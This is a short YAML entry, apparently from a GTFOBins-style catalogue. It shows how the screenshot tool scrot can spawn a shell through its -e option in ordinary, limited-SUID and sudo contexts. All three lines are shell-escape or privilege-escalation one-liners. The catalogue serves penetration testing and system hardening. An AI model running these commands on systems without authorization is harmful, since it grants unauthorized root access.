---
description: This requires a running X server.
functions:
  shell:
    - code: scrot -e /bin/sh
  limited-suid:
    - code: ./scrot -e /bin/sh
  sudo:
    - code: sudo scrot -e /bin/sh
---
